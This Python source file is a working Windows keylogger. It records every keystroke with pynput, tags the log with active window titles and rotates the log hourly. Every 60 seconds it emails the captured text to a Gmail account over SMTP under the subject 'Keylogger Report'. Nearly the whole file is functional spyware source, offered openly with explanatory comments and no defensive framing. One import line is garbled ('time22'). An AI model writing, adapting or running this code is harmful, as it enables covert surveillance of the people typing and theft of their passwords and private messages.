# --- Imports ---
# Standard libraries for time, file system, networking, and date/time handling
import time22
import os
import socket
from datetime import datetime
# Keyboard listener library to capture key presses
from pynput import keyboard
# Windows API calls to get the currently active window title
from ctypes import windll, create_unicode_buffer
# Threading for scheduling periodic email reports
import threading
# SMTP library for sending emails
import smtplib

# --- Configuration ---
# Directory where keystroke log files are stored
LOG_DIR = "logs"
# Modifier keys that are ignored and not logged individually
KEYS_TO_IGNORE = {keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl_l, keyboard.Key.ctrl_r, keyboard.Key.alt_l, keyboard.Key.alt_r}

# --- Email Configuration ---
# Gmail credentials and report interval (in seconds) for emailing logs1
EMAIL_ADDRESS = ""
EMAIL_PASSWORD = ""
REPORT_INTERVAL = 60  # Send email every 60 seconds

# --- Global State ---
# Tracks the active window, current hour (for log rotation), and the open log file
current_window = None
current_hour = -1
log_file = None
log_filename = ""

# --- Active Window Detection ---
# Uses Windows API to retrieve the title of the foreground window
def get_current_window():
    """Get the title of the current active window."""
    hwnd = windll.user32.GetForegroundWindow()          # Handle to the foreground window
    length = windll.user32.GetWindowTextLengthW(hwnd)    # Length of the window title
    buf = create_unicode_buffer(length + 1)              # Buffer to hold the title string
    windll.user32.GetWindowTextW(hwnd, buf, length + 1)  # Copy title into buffer
    return buf.value

# --- Log File Management ---
# Creates a new log file every hour and ensures the logs directory exists
def ensure_log_file():
    """Ensure the log file is open and rotated if the hour has changed."""
    global current_hour, log_file, log_filename
    
    now = datetime.now()
    # Rotate to a new log file when the hour changes
    if now.hour != current_hour:
        if log_file:
            log_file.close()        # Close the previous hour's log file
        
        if not os.path.exists(LOG_DIR):
            os.makedirs(LOG_DIR)    # Create logs directory if it doesn't exist
            
        # Name the log file with the current date and time
        log_filename = now.strftime(f"{LOG_DIR}/%Y-%m-%d__%H-%M-%S.log")
        log_file = open(log_filename, "a", encoding="utf-8")
        current_hour = now.hour
        print(f"Logging to {log_filename}")

# --- Email Sending (MIME imports for composing email) ---
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# Composes and sends the log content as an email via Gmail SMTP
def send_mail(log_content):
    try:
        hostname = socket.gethostname()                            # Get device name for the subject
        now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")     # Timestamp for the report
        
        # Build the email message
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS
        msg['Subject'] = f"Keylogger Report - {hostname} - {now_str}"
        
        # Email body includes device info + captured keystrokes
        body = f"""Keylogger Report
Device: {hostname}
Date: {now_str}
--------------------------------------------------------------------------------

{log_content}
"""
        msg.attach(MIMEText(body, 'plain', 'utf-8'))
        
        # Connect to Gmail SMTP, authenticate, send, and disconnect
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()                                # Upgrade connection to TLS encryption
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)      # Authenticate with Gmail
        server.send_message(msg)                         # Send the composed email
        server.quit()                                    # Close the SMTP connection
        print("Email sent successfully.")
    except Exception as e:
        print(f"Failed to send email: {e}")

# --- Periodic Reporting ---
# Reads the current log file and emails its content at regular intervals
def report():
    global log_file, log_filename
    
    # Flush buffered writes so the file on disk is up-to-date
    if log_file:
        log_file.flush()
        
    try:
        # Read and email the log file content if it exists and is non-empty
        if log_filename and os.path.exists(log_filename):
            with open(log_filename, "r", encoding="utf-8") as f:
                log_content = f.read()
            
            if log_content and len(log_content.strip()) > 0:
                send_mail(log_content)
    except Exception as e:
        print(f"Error preparing report: {e}")
    
    # Schedule the next report after REPORT_INTERVAL seconds (runs as a daemon thread)
    timer = threading.Timer(REPORT_INTERVAL, report)
    timer.daemon = True
    timer.start()

# --- Key Press Handler ---
# Called on every key press; logs the key to the file with window-change headers
def on_press(key):
    global current_window, log_file
    
    # Detect if the user switched to a different window and log a header for it
    new_window = get_current_window()
    if new_window != current_window:
        current_window = new_window
        ensure_log_file()
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_file.write(f"\n\n=== {timestamp} | {current_window} ===\n")
        log_file.flush()

    # Skip logging modifier keys (Shift, Ctrl, Alt)
    if key in KEYS_TO_IGNORE:
        return

    ensure_log_file()
    
    try:
        # Log printable characters directly
        if hasattr(key, 'char') and key.char is not None:
            log_file.write(key.char)
        else:
            # Handle special (non-printable) keys with readable representations
            if key == keyboard.Key.space:
                log_file.write(" ")
            elif key == keyboard.Key.enter:
                log_file.write("\n")
            elif key == keyboard.Key.tab:
                log_file.write("\t")
            elif key == keyboard.Key.backspace:
                log_file.write("[BACKSPACE]")
            elif key == keyboard.Key.esc:
                log_file.write("[ESC]")
            elif hasattr(key, 'name'):
                log_file.write(f"[{key.name.upper()}]")       # Named special keys (e.g., [CAPS_LOCK])
            elif hasattr(key, 'vk') and key.vk:
                log_file.write(f"[VK:{key.vk}]")              # Virtual key code fallback
            else:
                log_file.write(f"[UNK:{str(key)}]")           # Unknown key fallback
                
    except Exception as e:
        # Handle file/encoding errors during key logging
        print(f"Error logging key: {e}")
        # Re-open the log file if it was closed unexpectedly
        if log_file.closed:
             ensure_log_file()
        
    # Immediately write to disk after each key press
    log_file.flush()

# --- Entry Point ---
# Starts the periodic email reporter and begins listening for keyboard events
def main():
    print("Starting keylogger with email reporting...")
    
    # Kick off the first report cycle (self-scheduling via threading.Timer)
    report()
    
    # Start the keyboard listener; blocks until the listener stops
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Run main() only when the script is executed directly (not imported)
if __name__ == "__main__":
    main()
